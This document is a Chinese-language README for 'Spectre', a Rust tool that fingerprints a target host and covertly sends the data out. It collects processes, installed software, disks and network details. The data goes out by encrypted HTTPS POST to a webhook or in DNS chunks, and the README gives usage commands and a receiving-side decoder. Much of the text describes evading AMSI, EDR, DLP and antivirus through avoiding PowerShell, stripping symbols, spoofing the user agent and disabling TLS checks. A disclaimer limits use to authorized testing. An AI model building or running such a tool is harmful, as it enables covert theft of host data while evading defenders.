# Spectre

> ⚠️ **免责声明**：本项目仅用于**明确授权范围内**的安全评估、恶意样本分析、防病毒检测验证等防御性研究用途。请勿用于任何非法或未授权活动。使用者需自行承担一切法律与合规责任。

一个用 **Rust** 编写的轻量级目标环境（沙箱 / 虚拟机 / 主机）信息采集与**加密外带**工具。它在目标机内采集系统指纹，经 **zlib 压缩 + ChaCha20-Poly1305 认证加密**后，通过隐蔽信道（HTTPS 回连或 DNSLOG 分片）外带，最后由接收端脚本还原为可读 JSON。

---

## ✨ 特性

- **全面采集**：主机名 / CPU / 系统版本 / 用户 / 工作目录 / 桌面 / 内存 / 全量进程 / 已装软件 / C 盘及全盘磁盘 / 网卡(WLAN)信息。
- **无 PowerShell 依赖**：网卡、进程、磁盘、内存均通过底层 `sysinfo`（WinAPI `GetAdaptersAddresses` 等）获取，规避 AMSI / EDR 对 `powershell.exe` 子进程的行为检测。
- **端到端加密**：数据先 zlib 压缩再 ChaCha20-Poly1305 加密，明文零可见，规避 DLP 明文扫描。
- **双通道外带**：默认一次性 HTTPS POST 全量回连；备用 DNSLOG 分片外带（`<标签>.<你的域名>`）。
- **免杀编译**：release 自动剥离符号表、`/DEBUG:NONE` 彻底禁用 PDB、体积最优化、无 UPX 加壳。

---

## 📦 目录结构

```
.
├── Cargo.toml            # 依赖 + release 编译优化（体积/符号剥离）
├── .cargo/config.toml    # cargo 链接器参数：/DEBUG:NONE 彻底禁用 PDB
├── src/
│   ├── main.rs           # 入口：参数解析 + 编排 + dry-run 调试
│   ├── collect.rs        # 采集：主机/CPU/系统/用户/目录/内存/进程/软件/磁盘/网卡
│   ├── crypto.rs         # ChaCha20-Poly1305 认证加密 + 随机Nonce + Base32 编码
│   └── exfil.rs          # 外带：HTTPS POST 回连（备用 DNS 分片外带）
├── scripts/
│   └── decode.py         # 接收端：加密串/日志 → 解密 → JSON 明文
├── examples/
│   └── report.html       # 目标机情报报告示例（已脱敏）
├── CODE_AUDIT.md         # 代码审计报告（发布前待修复项）
```

---

## 🚀 构建

需要 Rust 工具链（Windows 下推荐 `x86_64-pc-windows-msvc`）：

```bash
cargo build --release
```

产物：`target/release/spectre.exe`（默认由 `.cargo/config.toml` 关闭 PDB 生成）。

---

## 🔧 使用

### 发送端（在目标环境运行）

```bash
# 1) 本机调试：只打印采集结果，不实际外带
spectre --dry-run

# 2) 正式外带：默认回连到编译期内置的 webhook 地址
spectre

# 3) 指定回连地址（覆盖内置默认值）
spectre --url https://webhook.site/xxxx-xxxx-xxxx

# 4) 指定密钥（64 位 hex，与解码端保持一致）
spectre --key <64位hex>

# 5) 备用 DNS 分片外带（不传 --url 时自动生效，需改 exfil.rs 的 BASE_DOMAIN）
spectre --id probe-1
```

### 接收端（本地还原）

```bash
# 方式一：直接从 webhook「请求体」粘贴加密串
python scripts/decode.py --raw "base64(nonce):base64(ct)" --needles "hostname,processes"

# 方式二：从 DNSLOG 导出日志还原
python scripts/decode.py --file dump.txt --reverse --needles "hostname,processes"

# 密钥与发送端一致时
python scripts/decode.py --raw "..." --key <64位hex>
```

> `decode.py` 默认使用内置演示密钥；如发送端用 `--key` 指定，解码时须传入相同 `--key`。

---

## 🔒 安全设计

| 维度 | 方案 |
|------|------|
| 采集免杀 | 全量走 `sysinfo`（WinAPI），零 PowerShell/ipconfig 子进程 |
| 传输加密 | zlib 压缩 → ChaCha20-Poly1305 认证加密（随机 Nonce），明文零可见 |
| 认证 | AAD `spectre-v1`，防重放/拼接 |
| 通道伪装 | UA 伪装 Chrome 124，URL 分段拼接弱化字符串特征 |
| 编译免杀 | `strip=symbols` + `/DEBUG:NONE`(无PDB) + `opt-level=z`/`lto=thin`/`panic=abort`，无 UPX |
| 沙箱适配 | 关闭 TLS 证书校验以规避沙箱 TLS 中间人劫持（`UnknownIssuer`） |

---

## 📚 外带流程

```
目标环境 执行 spectre.exe
   ├─ ① collect()             → JSON
   ├─ ② compress() (zlib)     → 减小体积
   ├─ ③ crypto::encrypt()     → ChaCha20-Poly1305 加密，随机 Nonce
   └─ ④ exfil::exfil_http()   → HTTPS POST 全量回连
                                     └（备用：DNS 分片外带）

webhook / DNSLOG 后台 收集加密串
   └─ scripts/decode.py       → 解密 → 完整 JSON 明文
```

---

## 📄 License

[MIT](./LICENSE)

---

## ⚠️ 注意事项

1. **不要给产物添加假签名 / 自签名证书** —— 会直接触发杀软行为检测（如 `DefenseEvasion`），得不偿失。合法代码签名证书才能降低检出，需通过正规渠道获取。
2. **关闭 TLS 证书校验是双刃剑** —— 能突破沙箱 TLS 劫持，但也可能被行为检测识别为规避手段。若需进一步压低检测率，可改用 DNSLOG 分片外带。
3. **外带地址**默认硬编码于 `src/main.rs`，部署前请替换为你自己的收集平台地址。
4. **沙箱若完全断网**，任何 HTTP/DNS 外带均无效，仅能测试静态检测率。

---

## 🧰 依赖

| crate | 用途 |
|-------|------|
| `sysinfo` | 系统/进程/磁盘/内存/网卡（WinAPI）采集 |
| `chacha20poly1305` | 认证加密 |
| `flate2` | zlib 压缩 |
| `ureq` + `rustls` | HTTPS POST 外带 / TLS |
| `data-encoding` | Base32 编码（DNS 标签） |
| `rand` | 随机数（Nonce） |
| `dns-lookup` | 备用 DNS 分片外带 |
